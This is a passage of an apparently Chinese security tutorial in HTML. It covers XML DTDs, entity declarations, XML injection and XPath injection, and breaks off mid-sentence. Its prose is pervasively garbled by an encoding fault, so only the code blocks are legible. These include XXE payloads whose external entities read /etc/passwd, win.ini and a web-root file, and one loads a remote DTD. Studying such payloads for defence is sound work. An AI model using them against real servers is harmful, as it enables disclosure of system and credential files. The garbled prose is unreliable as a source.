title="å£°æ˜â€éâ€¦/å³â€¦â€ç±»å‹çš„å†…å®¹"></a>å£°æ˜â€éâ€¦/å³â€¦â€ç±»å‹çš„å†…å®¹</h3><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">header</span>,(<span class="hljs-meta-keyword">message</span>|<span class="hljs-meta-keyword">body</span>))&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­å£°æ˜äº†ï¼šâ€noteâ€ å…ƒç´ å¿…é¡»åŒ…å« â€œtoâ€ å…ƒç´ ã€â€fromâ€ å…ƒç´ ã€â€headerâ€ å…ƒç´ ï¼Œä»¥åŠé â€œmessageâ€ å…ƒç´ å³ â€œbodyâ€ å…ƒç´ ã€‚</p><h3 id="å£°æ˜æ··åˆå‹çš„å†…å®¹"><a href="#å£°æ˜æ··åˆå‹çš„å†…å®¹" class="headerlink" title="å£°æ˜æ··åˆå‹çš„å†…å®¹"></a>å£°æ˜æ··åˆå‹çš„å†…å®¹</h3><p>å®ä¾‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">#PCDATA</span>|<span class="hljs-meta-keyword">to</span>|<span class="hljs-meta-keyword">from</span>|<span class="hljs-meta-keyword">header</span>|<span class="hljs-meta-keyword">message</span>)*&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­å£°æ˜äº†ï¼šâ€noteâ€ å…ƒç´ å¯åŒ…å«å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡çš„ PCDATAã€â€toâ€ã€â€fromâ€ã€â€headerâ€ æˆ–è€… â€œmessageâ€ã€‚</p><h2 id="å±æ€§å£°æ˜"><a href="#å±æ€§å£°æ˜" class="headerlink" title="å±æ€§å£°æ˜"></a>å±æ€§å£°æ˜</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ é»˜è®¤å€¼&gt;</span><br></code></pre></td></tr></table></figure><p>DTD å®ä¾‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-meta-keyword">payment</span> <span class="hljs-meta-keyword">Luckey</span> <span class="hljs-meta-keyword">CDATA</span> <span class="hljs-meta-string">&quot;Q&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML å®ä¾‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">Luckey</span>=<span class="hljs-string">&quot;Q&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h2><h3 id="å¼•ç”¨æ–¹å¼"><a href="#å¼•ç”¨æ–¹å¼" class="headerlink" title="å¼•ç”¨æ–¹å¼"></a>å¼•ç”¨æ–¹å¼</h3><p>XML å…ƒç´ ä»¥å½¢å¦‚ <code>&lt;tag&gt;foo&lt;/tag&gt;</code> çš„æ ‡ç­¾å¼€å§‹å’Œç»“æŸï¼Œå¦‚æœå…ƒç´ å†…éƒ¨å‡ºç°å¦‚<code>&lt;</code> çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè§£æå°±ä¼šå¤±è´¥ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒXML ç”¨å®ä½“å¼•ç”¨ï¼ˆentity referenceï¼‰æ›¿æ¢ç‰¹æ®Šå­—ç¬¦ã€‚XML é¢„å®šä¹‰äº”ä¸ªå®ä½“å¼•ç”¨ï¼Œå³ç”¨<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> æ›¿æ¢ <code>&lt; &gt; &amp; &#39; &quot;</code><br>å®ä½“å¼•ç”¨å¯ä»¥èµ·åˆ°ç±»ä¼¼å®å®šä¹‰å’Œæ–‡ä»¶åŒ…å«çš„æ•ˆæœï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›è‡ªå®šä¹‰å®ä½“å¼•ç”¨ï¼Œè¿™ä¸ªæ“ä½œåœ¨ç§°ä¸º Document Type Definationï¼ˆDTDï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„è¿‡ç¨‹ä¸­è¿›è¡Œ</p><ul><li><p><input checked="" disabled="" type="checkbox">  å¤–éƒ¨å¼•ç”¨</p></li><li><p>ç½‘ç»œä¸Š DTD æ–‡ä»¶</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE æ ¹å…ƒç´  <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;DTD_ID&quot;</span> <span class="hljs-meta-string">&quot;DTD_url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>å¤–éƒ¨ DTD æ–‡ä»¶</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE æ ¹å…ƒç´  <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTDæœ¬åœ°è·¯å¾„&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>XML version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///var/www/html/XML.dtd&quot;</span> &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root-element</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;XML.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br></code></pre></td></tr></table></figure><p><strong>PCDATA</strong><br>PCDATA çš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATA æ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚<br>è¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½•<code>&amp;</code>ï¼Œ<code>&lt;</code>ï¼Œæˆ–è€…<code>&gt;</code>å­—ç¬¦ï¼Œéœ€è¦ç”¨<code>&amp;amp</code> <code>&amp;lt</code> <code>&amp;gt</code>å®ä½“æ¥åˆ†åˆ«æ›¿æ¢ã€‚<br><strong>CDATA</strong><br>CDATA æ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ŒCDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ï¼Œåœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€ã€‚</p><ul><li><input checked="" disabled="" type="checkbox"> å†…éƒ¨å¼•ç”¨</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE æ ¹å…ƒç´  [body]&gt;</span><br></code></pre></td></tr></table></figure><p>å³ DTD åœ¨ XML æ–‡ä»¶å†…ï¼Œå¦‚ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span>&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h3><p><strong>å®ä½“ä½¿ç”¨æ–¹å¼</strong>ï¼šåˆ†ä¸ºå†…éƒ¨å£°æ˜å®ä½“å’Œå¼•ç”¨å¤–éƒ¨å®ä½“</p><ul><li><input checked="" disabled="" type="checkbox"> å†…éƒ¨å®ä½“</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY å®ä½“åç§° <span class="hljs-meta-string">&quot;å®ä½“çš„å€¼&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-string">&quot;Dawn&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span>Â©right;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>DTD åœ¨ XML æ–‡æ¡£ä¸­</p><ul><li><input checked="" disabled="" type="checkbox"> å¤–éƒ¨å®ä½“</li></ul><p>å¤–éƒ¨å®ä½“ï¼Œç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºã€‚æœ‰<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºã€‚</p><p>é€šè¿‡å¼•ç”¨<code>å…¬ç”¨DTD</code></p><ul><li>ç½‘ç»œä¸Š DTD æ–‡ä»¶</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE æ ¹å…ƒç´  <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;DTD_ID&quot;</span> <span class="hljs-meta-string">&quot;DTD_url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>å¤–éƒ¨ DTD æ–‡ä»¶</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE æ ¹å…ƒç´  <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTDæœ¬åœ°è·¯å¾„&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ä»£ç ï¼š</p><ul><li>ç½‘ç»œä¸Šçš„å¤–éƒ¨ DTD æ–‡ä»¶</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>Â©right;<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>å¤–éƒ¨ DTD æ–‡ä»¶</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root-element</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;XML.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ XML.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br></code></pre></td></tr></table></figure><p>å¤–éƒ¨å®ä½“åè®®æ”¯æŒ</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211204212420637.png"></p><h3 id="å®ä½“å‚æ•°"><a href="#å®ä½“å‚æ•°" class="headerlink" title="å®ä½“å‚æ•°"></a>å®ä½“å‚æ•°</h3><ul><li>é€šç”¨å®ä½“</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">updateProfile</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>å‚æ•°å®ä½“</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">an-element</span> <span class="hljs-meta-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote-dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span><br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><blockquote><p>å¯¹äºå‚æ•°å®ä½“ï¼š</p><p>1.ä½¿ç”¨ <code>% å®ä½“å</code>(<strong>è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘</strong>) åœ¨ DTD ä¸­å®šä¹‰ï¼Œå¹¶ä¸”<strong>åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ <code>%å®ä½“å;</code> å¼•ç”¨</strong> 2.åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“ 3.å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨</p></blockquote><h1 id="XML-æ³¨å…¥"><a href="#XML-æ³¨å…¥" class="headerlink" title="XML æ³¨å…¥"></a>XML æ³¨å…¥</h1><p>åœ¨ç”¨æˆ·èƒ½æ§åˆ¶è¾“å…¥æ—¶ï¼Œæ”¹å˜é—­åˆå³å¯æ³¨å…¥</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png"></p><p>é€šè¿‡ XML æ³¨å…¥æ·»åŠ äº†ä¸€ä¸ªåä¸º USER2 çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚<br>XML æ³¨å…¥ä¸¤å¤§è¦ç´ ï¼š<strong>æ ‡ç­¾é—­åˆå’Œè·å– XML è¡¨ç»“æ„</strong></p><h1 id="XPath-æ³¨å…¥"><a href="#XPath-æ³¨å…¥" class="headerlink" title="XPath æ³¨å…¥"></a>XPath æ³¨å…¥</h1><p>XPath æ³¨å…¥æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨ XPath è§£æå™¨çš„æ¾æ•£è¾“å…¥å’Œå®¹é”™ç‰¹æ€§ï¼Œèƒ½å¤Ÿåœ¨ URLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„ XPath æŸ¥è¯¢ä»£ç ï¼Œä»¥è·å¾—æƒé™ä¿¡æ¯çš„è®¿é—®æƒå¹¶æ›´æ”¹è¿™äº›ä¿¡æ¯ã€‚XPath æ³¨å…¥æ”»å‡»æ˜¯é’ˆå¯¹ Web æœåŠ¡åº”ç”¨æ–°çš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨äº‹å…ˆä¸çŸ¥é“ XPath æŸ¥è¯¢ç›¸å…³çŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ XPath æŸ¥è¯¢å¾—åˆ°ä¸€ä¸ª XML æ–‡æ¡£çš„å®Œæ•´å†…å®¹ã€‚</p><p>XPath æ³¨å…¥å‘ç”Ÿåœ¨å½“ç«™ç‚¹ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯æ¥æ„é€ è¯·æ±‚ä»¥è·å– XML æ•°æ®ã€‚æ”»å‡»è€…å¯¹ç«™ç‚¹å‘é€ç»è¿‡ç‰¹æ®Šæ„é€ çš„ä¿¡æ¯æ¥æ¢ç©¶ç«™ç‚¹ä½¿ç”¨çš„ XML æ˜¯å¦‚ä½•æ„é€ çš„ï¼Œä»è€Œè¿›ä¸€æ­¥è·å–æ­£å¸¸é€”å¾„ä¸‹æ— æ³•è·å–çš„æ•°æ®ã€‚å½“ XML æ•°æ®è¢«ç”¨ä½œè´¦æˆ·éªŒè¯æ—¶ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æå‡ä»–çš„æƒé™ã€‚</p><p>XPath æ³¨å…¥æ”»å‡»åŒ SQL æ³¨å…¥æ”»å‡»ç±»ä¼¼ï¼Œä½†ä¸ SQL æ³¨å…¥ç›¸æ¯”ï¼ŒXPath å…·æœ‰çš„ä¼˜åŠ¿ï¼š</p><ol><li>å¹¿æ³›æ€§<br>åªè¦æ˜¯åˆ©ç”¨ XPath è¯­æ³•çš„ Web åº”ç”¨ç¨‹åºè‹¥æœªå¯¹è¾“å…¥çš„ XPath æŸ¥è¯¢åšä¸¥æ ¼çš„å¤„ç†éƒ½ä¼šå­˜åœ¨ XPath æ³¨å…¥æ¼æ´ã€‚è€Œåœ¨ SQL æ³¨å…¥æ”»å‡»è¿‡ç¨‹ä¸­æ ¹æ®æ•°æ®åº“æ”¯æŒçš„ SQL è¯­è¨€ä¸åŒï¼Œæ³¨å…¥æ”»å‡»çš„å®ç°å¯èƒ½ä¸åŒã€‚</li><li>å±å®³æ€§å¤§<br>XPath è¯­è¨€å‡ ä¹å¯ä»¥æ²¡æœ‰è®¿é—®æ§åˆ¶é™åˆ¶çš„å¼•ç”¨ XML æ–‡æ¡£çš„æ‰€æœ‰éƒ¨åˆ†ã€‚è€Œåœ¨ SQL 